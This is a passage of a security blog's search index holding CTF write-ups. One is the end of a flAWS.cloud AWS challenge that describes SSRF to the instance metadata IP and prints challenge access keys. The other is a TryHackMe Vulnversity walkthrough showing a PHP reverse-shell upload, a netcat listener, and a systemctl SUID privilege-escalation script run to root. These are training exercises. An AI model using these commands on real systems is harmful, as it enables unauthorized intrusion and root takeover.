\u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;https://twitter.com/Agarri_FR\u0026#34;\u0026gt;Nicolas Grégoire\u0026lt;/a\u0026gt; discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (\u0026lt;a href=\u0026#34;https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;). He also found issues with access to that magic IP with \u0026lt;a href=\u0026#34;https://hackerone.com/reports/53088\u0026#34;\u0026gt;Phabricator\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;https://hackerone.com/reports/53004\u0026#34;\u0026gt;Coinbase\u0026lt;/a\u0026gt;. \u0026lt;/ul\u0026gt; A similar problem to getting access to the IAM profile\u0026#39;s access keys is access to the EC2\u0026#39;s user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials. \u0026lt;h3\u0026gt;Avoiding this mistake\u0026lt;/h3\u0026gt; Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible. \u0026lt;hr size=3 color=\u0026#34;#00d000\u0026#34; /\u0026gt; \u0026lt;h1\u0026gt;Level 6\u0026lt;/h1\u0026gt; For this final challenge, you\u0026#39;re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. \u0026lt;p\u0026gt;Access key ID: AKIAJFQ6E7BY57Q3OBGA\u0026lt;br\u0026gt; Secret: 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\u0026lt;br\u0026gt; \u0026lt;p\u0026gt;Need a hint? Go to \u0026lt;a href=\u0026#34;./hint1.html\u0026#34;\u0026gt;Hint 1\u0026lt;/a\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;ubuntu@ubuntu-2204:~/.aws$   we got level 6 access keys\nlets we move into Level 6\n","description":"flAWS.cloud is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels.","id":2,"section":"posts","tags":["aws-cli","git","s3"],"title":"Flawscloud","uri":"https://fromzerotoonee.github.io/en/posts/flawscloud/"},{"content":"Road Map  Kill Chain Summary Vulnversiy is the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some directory\u0026rsquo;s, which helps To upload our shell codes. with help of securifera github page we can able to identify correct file extension, gained user shell using weevely and escalated privilege using SUID bit binary with help of Gtfobins.\nInfo Table   Title Vulnversity    Description Learn about active recon, web app attacks and privilege escalation.    Difficulty Easy   Maker Try Hack Me    Reconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  $ nmap -sV 10.10.8.53 Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-28 15:35 IST Nmap scan report for 10.10.8.53 Host is up (0.30s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.94 seconds   The result of nmap scan makes port 3333 interest because. service HTTP belongs to port 80. lets dig port 3333\n directory search lets do directory search and identify if any sensitive directory are exposed\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $gobuster dir -u http://10.10.1.215:3333 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.1.215:3333 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/28 23:29:54 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 292] /.htaccess (Status: 403) [Size: 297] /.htpasswd (Status: 403) [Size: 297] /css (Status: 301) [Size: 315] [--\u0026gt; http://10.10.1.215:3333/css/] /fonts (Status: 301) [Size: 317] [--\u0026gt; http://10.10.1.215:3333/fonts/] /images (Status: 301) [Size: 318] [--\u0026gt; http://10.10.1.215:3333/images/] /index.html (Status: 200) [Size: 33014] /internal (Status: 301) [Size: 320] [--\u0026gt; http://10.10.1.215:3333/internal/] /js (Status: 301) [Size: 314] [--\u0026gt; http://10.10.1.215:3333/js/] /server-status (Status: 403) [Size: 301] =============================================================== 2022/04/28 23:31:55 Finished ===============================================================    here there is a place to upload file, lets try to upload reverse shell file, in kali /usr/share/webshells/php/ directory we have set of php shell payloads. just modify attacker ip and port and upload\nbut why php shell ? PHP is one of the widely used languages for web development (more than 60%) which makes it one of the most targeted ones\nReverse shell 1  $vim /usr/share/webshells/php/php-reverse-shell.php    upload the php reverse shell\n we notice that .php extension is not allowed to upload, lets try to bypass or find right extension to upload\n we need list of extension file we will use securifera filename extension file which is available on his github page\n make sure that you need to untuck url encoding which is available under Payload Encoding\n after our payload has been uploaded, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory\n we finded uploads directory and it holds our payload, before accessing payload file, make sure netcat listen on port which has configured on payload\nInitial FootHold 1 2 3 4 5 6 7 8 9 10 11 12 13  ┌─[atomloop@atomloop-virtualbox]─[~] └──_ $sudo nc -lvnp 8181 [sudo] password for atomloop: listening on [any] 8181 ... connect to [10.18.105.26] from (UNKNOWN) [10.10.25.213] 37564 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 05:48:30 up 1:40, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $   yes, we got our initial foot hold, lets try to esculate privilege, lets list any SUID files\nSUID files 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $ sudo -l sudo: no tty present and no askpass program specified $ find / -perm -u=s 2\u0026gt;/dev/null /usr/bin/newuidmap /usr/bin/chfn /usr/bin/newgidmap /usr/bin/sudo /usr/bin/chsh /usr/bin/passwd /usr/bin/pkexec /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/at /usr/lib/snapd/snap-confine /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/squid/pinger /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /bin/su /bin/ntfs-3g /bin/mount /bin/ping6 /bin/umount /bin/systemctl /bin/ping /bin/fusermount /sbin/mount.cifs   GTFOBins is a collection of Unix binaries that can be used to bypass local security restrictions in misconfigured systems\n1 2 3 4 5 6 7 8 9  TempFile=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile /bin/systemctl link $TempFile /bin/systemctl enable --now $TempFile /bin/bash -p   we have given suid permission to /bin/bash which can allow us to run bash as root.\nSystemctl is the tool used to control the systemd init service. systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks.\nTempFile=$(mktemp).service - we are creating an environment variable called “TempFile” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)\nTempFile=$(mktemp).service the config we need our unit file to execute.\n[Service] ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile The problem is that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.\necho ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)\n[Service] - the first part of our unit file\nExecStart=/bin/sh -c “chmod +s /bin/bash” - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes),\nwe have given suid permission to /bin/bash which can allow us to run bash as root.\n[Install] - the second part of our unit file\nWantedBy=multi-user.target’ \u0026gt; $TempFile- sets the state (or run level) at which this service will run (notice the closing single quote?), the \u0026gt; directs all our inputs to the TempFile env variable\n/bin/systemctl link $TempFile - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths\n/bin/systemctl enable —now $TempFile - “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the \u0026quot;[Install]\u0026quot; sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the --now switch…”\nRoot shell └──_ #nc -lvnp 8181 listening on [any] 8181 ... connect to [10.18.105.26] from (UNKNOWN) [10.10.240.190] 60678 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 21:38:51 up 26 min, 0 users, load average: 0.00, 0.00, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ TempFile=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TempFile /bin/systemctl link $TempFile /bin/systemctl enable --now $TempFile /bin/bash -p$ \u0026gt; \u0026gt; \u0026gt; \u0026gt; $ Created symlink from /etc/systemd/system/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service. $ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service. $ /bin/bash -p whoami root See You on the next Blog, Happy Hacking\n","description":"vulnversiy  was the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of  securifera github page we can able to identify correct file  extension, gained user shell using php-reverse-shell and escalated privilege using SUID bit binary with help of Gtfobins.","id":3,"section":"posts","tags":["suid","systemctl"],"title":"Try Hach Me - Vulnversity","uri":"https://fromzerotoonee.github.io/en/posts/vulnversity/"},{"content":"Hi all, Welcome to my blog, I am Atom cyber security analyst(pen tester, ctf player). here you can able to find writeups of (Try Hack Me, Vulnhub, Hack The Box and CTFs) in the level of beginner\n","description":"Hugo, the world’s fastest framework for building websites","id":8,"section":"","tags":null,"title":"About","uri":"https://fromzerotoonee.github.io/en/about/"}]